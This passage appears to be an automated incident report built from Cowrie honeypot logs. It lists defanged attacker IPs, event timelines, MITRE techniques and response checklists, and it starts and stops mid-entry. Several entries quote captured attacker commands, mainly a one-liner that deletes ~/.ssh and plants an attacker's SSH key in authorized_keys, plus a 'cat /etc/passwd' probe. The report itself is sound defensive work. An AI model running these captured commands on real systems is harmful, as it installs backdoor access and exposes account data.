| `2026-08-01 10:56:22` | `cowrie.login.success` |
| `2026-08-01 10:56:22` | `cowrie.direct-tcpip.request` |
| `2026-08-01 10:56:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.23.209[.]47` to AbuseIPDB if not already reported
- [ ] Block `186.23.209[.]47` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-317406bb9b4e

| Field | Detail |
|---|---|
| **Source IP** | `185.2.228[.]48` |
| **First Seen** | 2026-08-01 10:56 |
| **Last Seen** | 2026-08-01 10:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 10:56:20` | `cowrie.session.connect` |
| `2026-08-01 10:56:20` | `cowrie.client.version` |
| `2026-08-01 10:56:20` | `cowrie.client.kex` |
| `2026-08-01 10:56:22` | `cowrie.login.success` |
| `2026-08-01 10:56:22` | `cowrie.direct-tcpip.request` |
| `2026-08-01 10:56:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.2.228[.]48` to AbuseIPDB if not already reported
- [ ] Block `185.2.228[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19e89a1871c3

| Field | Detail |
|---|---|
| **Source IP** | `20.227.140[.]178` |
| **First Seen** | 2026-08-01 11:00 |
| **Last Seen** | 2026-08-01 11:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:00:20` | `cowrie.session.connect` |
| `2026-08-01 11:00:20` | `cowrie.client.version` |
| `2026-08-01 11:00:21` | `cowrie.client.kex` |
| `2026-08-01 11:00:21` | `cowrie.login.success` |
| `2026-08-01 11:00:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.227.140[.]178` to AbuseIPDB if not already reported
- [ ] Block `20.227.140[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-873adc444a5f

| Field | Detail |
|---|---|
| **Source IP** | `118.26.153[.]102` |
| **First Seen** | 2026-08-01 11:04 |
| **Last Seen** | 2026-08-01 11:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:04:44` | `cowrie.session.connect` |
| `2026-08-01 11:04:45` | `cowrie.client.version` |
| `2026-08-01 11:04:45` | `cowrie.client.kex` |
| `2026-08-01 11:04:47` | `cowrie.login.success` |
| `2026-08-01 11:04:48` | `cowrie.direct-tcpip.request` |
| `2026-08-01 11:04:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.153[.]102` to AbuseIPDB if not already reported
- [ ] Block `118.26.153[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-970281982356

| Field | Detail |
|---|---|
| **Source IP** | `50.187.155[.]130` |
| **First Seen** | 2026-08-01 11:04 |
| **Last Seen** | 2026-08-01 11:05 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:04:57` | `cowrie.session.connect` |
| `2026-08-01 11:04:58` | `cowrie.client.version` |
| `2026-08-01 11:04:58` | `cowrie.client.kex` |
| `2026-08-01 11:05:00` | `cowrie.login.success` |
| `2026-08-01 11:05:00` | `cowrie.direct-tcpip.request` |
| `2026-08-01 11:05:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.187.155[.]130` to AbuseIPDB if not already reported
- [ ] Block `50.187.155[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f769fb0b419

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 11:22 |
| **Last Seen** | 2026-08-01 11:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:22:01` | `cowrie.session.connect` |
| `2026-08-01 11:22:01` | `cowrie.client.version` |
| `2026-08-01 11:22:01` | `cowrie.client.kex` |
| `2026-08-01 11:22:01` | `cowrie.login.success` |
| `2026-08-01 11:22:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8cf3c6573bd

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 11:22 |
| **Last Seen** | 2026-08-01 11:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:22:01` | `cowrie.session.connect` |
| `2026-08-01 11:22:01` | `cowrie.client.version` |
| `2026-08-01 11:22:01` | `cowrie.client.kex` |
| `2026-08-01 11:22:01` | `cowrie.login.success` |
| `2026-08-01 11:22:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72a912562bb5

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 11:22 |
| **Last Seen** | 2026-08-01 11:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:22:07` | `cowrie.session.connect` |
| `2026-08-01 11:22:07` | `cowrie.client.version` |
| `2026-08-01 11:22:07` | `cowrie.client.kex` |
| `2026-08-01 11:22:08` | `cowrie.login.success` |
| `2026-08-01 11:22:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6d239576b89

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-01 11:22 |
| **Last Seen** | 2026-08-01 11:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:22:08` | `cowrie.session.connect` |
| `2026-08-01 11:22:08` | `cowrie.client.version` |
| `2026-08-01 11:22:08` | `cowrie.client.kex` |
| `2026-08-01 11:22:08` | `cowrie.login.success` |
| `2026-08-01 11:22:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-654d8ae8ce0c

| Field | Detail |
|---|---|
| **Source IP** | `201.63.52[.]54` |
| **First Seen** | 2026-08-01 11:24 |
| **Last Seen** | 2026-08-01 11:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:24:21` | `cowrie.session.connect` |
| `2026-08-01 11:24:21` | `cowrie.client.version` |
| `2026-08-01 11:24:21` | `cowrie.client.kex` |
| `2026-08-01 11:24:23` | `cowrie.login.success` |
| `2026-08-01 11:24:24` | `cowrie.direct-tcpip.request` |
| `2026-08-01 11:24:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.52[.]54` to AbuseIPDB if not already reported
- [ ] Block `201.63.52[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ed255c73d11

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-01 11:26 |
| **Last Seen** | 2026-08-01 11:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:26:23` | `cowrie.session.connect` |
| `2026-08-01 11:26:23` | `cowrie.client.version` |
| `2026-08-01 11:26:23` | `cowrie.client.kex` |
| `2026-08-01 11:26:24` | `cowrie.login.success` |
| `2026-08-01 11:26:24` | `cowrie.direct-tcpip.request` |
| `2026-08-01 11:26:24` | `cowrie.direct-tcpip.data` |
| `2026-08-01 11:26:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-397d73b5fb4e

| Field | Detail |
|---|---|
| **Source IP** | `116.48.150[.]115` |
| **First Seen** | 2026-08-01 11:31 |
| **Last Seen** | 2026-08-01 11:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:31:14` | `cowrie.session.connect` |
| `2026-08-01 11:31:15` | `cowrie.client.version` |
| `2026-08-01 11:31:15` | `cowrie.client.kex` |
| `2026-08-01 11:31:17` | `cowrie.login.success` |
| `2026-08-01 11:31:18` | `cowrie.direct-tcpip.request` |
| `2026-08-01 11:31:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.150[.]115` to AbuseIPDB if not already reported
- [ ] Block `116.48.150[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fca326151cd1

| Field | Detail |
|---|---|
| **Source IP** | `89.253.90[.]113` |
| **First Seen** | 2026-08-01 11:31 |
| **Last Seen** | 2026-08-01 11:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:31:23` | `cowrie.session.connect` |
| `2026-08-01 11:31:23` | `cowrie.client.version` |
| `2026-08-01 11:31:23` | `cowrie.client.kex` |
| `2026-08-01 11:31:24` | `cowrie.login.success` |
| `2026-08-01 11:31:25` | `cowrie.direct-tcpip.request` |
| `2026-08-01 11:31:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.253.90[.]113` to AbuseIPDB if not already reported
- [ ] Block `89.253.90[.]113` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67d203d25ea6

| Field | Detail |
|---|---|
| **Source IP** | `218.248.19[.]102` |
| **First Seen** | 2026-08-01 11:31 |
| **Last Seen** | 2026-08-01 11:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:31:30` | `cowrie.session.connect` |
| `2026-08-01 11:31:31` | `cowrie.client.version` |
| `2026-08-01 11:31:31` | `cowrie.client.kex` |
| `2026-08-01 11:31:33` | `cowrie.login.success` |
| `2026-08-01 11:31:33` | `cowrie.direct-tcpip.request` |
| `2026-08-01 11:31:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.248.19[.]102` to AbuseIPDB if not already reported
- [ ] Block `218.248.19[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2891e6d274fe

| Field | Detail |
|---|---|
| **Source IP** | `154.83.15[.]101` |
| **First Seen** | 2026-08-01 11:32 |
| **Last Seen** | 2026-08-01 11:32 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:32:11` | `cowrie.session.connect` |
| `2026-08-01 11:32:11` | `cowrie.client.version` |
| `2026-08-01 11:32:11` | `cowrie.client.kex` |
| `2026-08-01 11:32:12` | `cowrie.login.success` |
| `2026-08-01 11:32:13` | `cowrie.session.params` |
| `2026-08-01 11:32:13` | `cowrie.command.input` |
| `2026-08-01 11:32:13` | `cowrie.command.failed` |
| `2026-08-01 11:32:13` | `cowrie.log.closed` |
| `2026-08-01 11:32:14` | `cowrie.session.params` |
| `2026-08-01 11:32:14` | `cowrie.command.input` |
| `2026-08-01 11:32:14` | `cowrie.session.file_download` |
| `2026-08-01 11:32:14` | `cowrie.log.closed` |
| `2026-08-01 11:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.15[.]101` to AbuseIPDB if not already reported
- [ ] Block `154.83.15[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e089177f20b6

| Field | Detail |
|---|---|
| **Source IP** | `154.83.15[.]101` |
| **First Seen** | 2026-08-01 11:32 |
| **Last Seen** | 2026-08-01 11:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:32:14` | `cowrie.session.connect` |
| `2026-08-01 11:32:14` | `cowrie.client.version` |
| `2026-08-01 11:32:15` | `cowrie.client.kex` |
| `2026-08-01 11:32:15` | `cowrie.login.success` |
| `2026-08-01 11:32:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.15[.]101` to AbuseIPDB if not already reported
- [ ] Block `154.83.15[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63d1fab002a5

| Field | Detail |
|---|---|
| **Source IP** | `154.83.15[.]101` |
| **First Seen** | 2026-08-01 11:32 |
| **Last Seen** | 2026-08-01 11:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:32:16` | `cowrie.session.connect` |
| `2026-08-01 11:32:16` | `cowrie.client.version` |
| `2026-08-01 11:32:16` | `cowrie.client.kex` |
| `2026-08-01 11:32:17` | `cowrie.login.success` |
| `2026-08-01 11:32:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.15[.]101` to AbuseIPDB if not already reported
- [ ] Block `154.83.15[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca61cf0b1aca

| Field | Detail |
|---|---|
| **Source IP** | `181.188.148[.]74` |
| **First Seen** | 2026-08-01 11:33 |
| **Last Seen** | 2026-08-01 11:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:33:23` | `cowrie.session.connect` |
| `2026-08-01 11:33:23` | `cowrie.client.version` |
| `2026-08-01 11:33:23` | `cowrie.client.kex` |
| `2026-08-01 11:33:23` | `cowrie.login.success` |
| `2026-08-01 11:33:25` | `cowrie.session.params` |
| `2026-08-01 11:33:25` | `cowrie.command.input` |
| `2026-08-01 11:33:25` | `cowrie.command.failed` |
| `2026-08-01 11:33:25` | `cowrie.log.closed` |
| `2026-08-01 11:33:26` | `cowrie.session.params` |
| `2026-08-01 11:33:26` | `cowrie.command.input` |
| `2026-08-01 11:33:26` | `cowrie.session.file_download` |
| `2026-08-01 11:33:26` | `cowrie.log.closed` |
| `2026-08-01 11:33:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.188.148[.]74` to AbuseIPDB if not already reported
- [ ] Block `181.188.148[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94f0365f50d6

| Field | Detail |
|---|---|
| **Source IP** | `181.188.148[.]74` |
| **First Seen** | 2026-08-01 11:33 |
| **Last Seen** | 2026-08-01 11:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:33:26` | `cowrie.session.connect` |
| `2026-08-01 11:33:26` | `cowrie.client.version` |
| `2026-08-01 11:33:26` | `cowrie.client.kex` |
| `2026-08-01 11:33:27` | `cowrie.login.success` |
| `2026-08-01 11:33:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.188.148[.]74` to AbuseIPDB if not already reported
- [ ] Block `181.188.148[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7c356dc3878

| Field | Detail |
|---|---|
| **Source IP** | `181.188.148[.]74` |
| **First Seen** | 2026-08-01 11:33 |
| **Last Seen** | 2026-08-01 11:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:33:27` | `cowrie.session.connect` |
| `2026-08-01 11:33:27` | `cowrie.client.version` |
| `2026-08-01 11:33:27` | `cowrie.client.kex` |
| `2026-08-01 11:33:28` | `cowrie.login.success` |
| `2026-08-01 11:33:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.188.148[.]74` to AbuseIPDB if not already reported
- [ ] Block `181.188.148[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34fe105b2d25

| Field | Detail |
|---|---|
| **Source IP** | `8.137.167[.]190` |
| **First Seen** | 2026-08-01 11:34 |
| **Last Seen** | 2026-08-01 11:35 |
| **Session Duration** | 62s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:34:41` | `cowrie.session.connect` |
| `2026-08-01 11:34:58` | `cowrie.telnet.option` |
| `2026-08-01 11:34:59` | `cowrie.telnet.option` |
| `2026-08-01 11:34:59` | `cowrie.login.success` |
| `2026-08-01 11:35:00` | `cowrie.session.params` |
| `2026-08-01 11:35:00` | `cowrie.telnet.option` |
| `2026-08-01 11:35:00` | `cowrie.telnet.option` |
| `2026-08-01 11:35:00` | `cowrie.command.input` |
| `2026-08-01 11:35:00` | `cowrie.command.input` |
| `2026-08-01 11:35:00` | `cowrie.command.input` |
| `2026-08-01 11:35:43` | `cowrie.command.input` |
| `2026-08-01 11:35:43` | `cowrie.command.failed` |
| `2026-08-01 11:35:43` | `cowrie.command.input` |
| `2026-08-01 11:35:43` | `cowrie.command.failed` |
| `2026-08-01 11:35:43` | `cowrie.command.input` |
| `2026-08-01 11:35:43` | `cowrie.command.failed` |
| `2026-08-01 11:35:43` | `cowrie.command.input` |
| `2026-08-01 11:35:43` | `cowrie.command.input` |
| `2026-08-01 11:35:43` | `cowrie.command.input` |
| `2026-08-01 11:35:43` | `cowrie.command.input` |
| `2026-08-01 11:35:43` | `cowrie.command.input` |
| `2026-08-01 11:35:43` | `cowrie.command.input` |
| `2026-08-01 11:35:44` | `cowrie.log.closed` |
| `2026-08-01 11:35:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `8.137.167[.]190` to AbuseIPDB if not already reported
- [ ] Block `8.137.167[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efd4bb603fcf

| Field | Detail |
|---|---|
| **Source IP** | `139.100.207[.]64` |
| **First Seen** | 2026-08-01 11:35 |
| **Last Seen** | 2026-08-01 11:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:35:42` | `cowrie.session.connect` |
| `2026-08-01 11:35:42` | `cowrie.client.version` |
| `2026-08-01 11:35:42` | `cowrie.client.kex` |
| `2026-08-01 11:35:42` | `cowrie.login.success` |
| `2026-08-01 11:35:43` | `cowrie.session.params` |
| `2026-08-01 11:35:43` | `cowrie.command.input` |
| `2026-08-01 11:35:43` | `cowrie.command.failed` |
| `2026-08-01 11:35:43` | `cowrie.log.closed` |
| `2026-08-01 11:35:44` | `cowrie.session.params` |
| `2026-08-01 11:35:44` | `cowrie.command.input` |
| `2026-08-01 11:35:44` | `cowrie.session.file_download` |
| `2026-08-01 11:35:44` | `cowrie.log.closed` |
| `2026-08-01 11:35:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.100.207[.]64` to AbuseIPDB if not already reported
- [ ] Block `139.100.207[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3cc68fc73a2

| Field | Detail |
|---|---|
| **Source IP** | `139.100.207[.]64` |
| **First Seen** | 2026-08-01 11:35 |
| **Last Seen** | 2026-08-01 11:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:35:44` | `cowrie.session.connect` |
| `2026-08-01 11:35:44` | `cowrie.client.version` |
| `2026-08-01 11:35:44` | `cowrie.client.kex` |
| `2026-08-01 11:35:44` | `cowrie.login.success` |
| `2026-08-01 11:35:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.100.207[.]64` to AbuseIPDB if not already reported
- [ ] Block `139.100.207[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87cca0063787

| Field | Detail |
|---|---|
| **Source IP** | `139.100.207[.]64` |
| **First Seen** | 2026-08-01 11:35 |
| **Last Seen** | 2026-08-01 11:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 11:35:45` | `cowrie.session.connect` |
| `2026-08-01 11:35:45` | `cowrie.client.version` |
| `2026-08-01 11:35:45` | `cowrie.client.kex` |
| `2026-08-01 11:35:45` | `cowrie.login.success` |
| `2026-08-01 11:35:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.100.207[.]64` to AbuseIPDB if not already reported
- [ ] Block `139.100.207[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abdcfcdcc944

| Field | Detail |
|---|---|
| **Source IP** | `8.137.167[.]190` |
